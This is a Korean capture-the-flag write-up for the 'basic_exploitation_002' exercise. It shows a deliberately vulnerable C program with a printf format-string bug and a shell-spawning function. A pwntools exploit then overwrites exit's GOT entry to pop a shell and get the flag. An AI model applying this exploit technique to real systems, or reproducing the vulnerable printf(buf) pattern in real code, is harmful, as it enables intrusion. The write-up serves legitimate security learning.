# Exercise: basic_exploitation_002

**실습 환경**

```c
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

**basic_exploitation_002.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    read(0, buf, 0x80);
    printf(buf);

    exit(0);
}
```
<br>
 
**코드 분석**

`get_shell` 함수가 보이니 목적지는 정해졌고, `printf` 에서 포맷스트링 버그를 일으킬 수 있는 것이 보인다. 그리고 적용 보안기법이 Partial RELRO 인걸 보니 GOT 조작이 먼저 떠오른다. 

<br>

**동적 분석**
<img width="745" height="347" alt="image" src="https://github.com/user-attachments/assets/9fe5cbbc-53ef-46d4-a203-c0436f0405cd" />

일단 got 랑 겟쉘 함수주소 차이를 보니 뒤에 두개만 다르고 나머진 다 같다.   

<br>

<img width="668" height="156" alt="image" src="https://github.com/user-attachments/assets/cc16aa0d-e4ec-444b-af30-2e9fc89ecb24" />


임의로 AAAA 를 넣어보니 `esp+4`에 해당하는 첫 번째 인자에 쓰이고, 여기에서 임의로 잘 쓰면 바로 플래그를 얻을 수 있을것같다.  

pie도 꺼져있겠다 바로 코드를 적어보자.  

<br>

**익스플로잇 코드**

```python
 from pwn import *

p = process('./target')
elf = ELF('./target')

exit_got = elf.got['exit']
get_shell = elf.symbols['get_shell']

payload = fmtstr_payload(1, {exit_got: get_shell}, write_size='short')
p.sendline(payload)
p.interactive()
```
 
pwntools 에 있는 fmtstr_payload를 사용했다.   

직접 계산안해도 되어서 편하게 했다. 양식은 아래에 적어두겠다.  

- `fmtstr_payload(offset, writes, write_size='byte')`
    - `offset` : 몇 번째 인자부터 포맷 스트링으로 사용할지를 의미
    - `writes` : 어떤 주소에 어떤 값을 쓸지 dict 형식으로 전달
        - 예: {0x0804a010: 0x080484b6} → 주소 0x0804a010에 0x080484b6 쓰기
    - `write_size`
        - byte (1바이트 단위)
        - short (2바이트 단위)
        - int (4바이트 단위)
     

<br>

바로 서버에 날려보면?  

<img width="673" height="230" alt="image" src="https://github.com/user-attachments/assets/3f92b00a-f872-4a9b-ac22-04c6510f714f" />


플래그가 나왔다.  
